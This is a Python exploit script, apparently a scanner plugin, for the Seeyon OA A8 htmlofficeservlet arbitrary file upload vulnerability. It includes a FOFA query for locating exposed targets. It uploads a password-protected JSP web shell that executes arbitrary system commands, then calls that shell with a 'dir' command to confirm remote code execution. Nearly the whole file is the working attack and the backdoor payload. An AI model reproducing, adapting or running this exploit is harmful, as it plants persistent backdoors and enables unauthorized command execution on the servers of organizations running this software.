#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import time
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/致远OA/致远OA A8 htmlofficeservlet 任意文件上传漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '致远OA A8 htmlofficeservlet 任意文件上传',

      'level'     :   'high',

      'FOFA'      :   'title="致远A8-V5协同管理软件 V6.1sp1"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/seeyon/htmlofficeservlet'
  data = '''
DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("calsee".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("
<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>>a6e4f045d4b8506bf492ada7e3390d7ce
  '''
  url1 = url + target
  ret['url'] = url1
  payload = '/seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir'
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    time.sleep(1)
    resp=requests.get(url=url+payload,headers=headers,timeout=5,verify=False)
    if '卷的序列号是' in resp.text and '驱动器' in resp.text:
      ret['huixian'] = '漏洞验证地址是:'+url+payload+'\n'+resp.text+'\n'
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret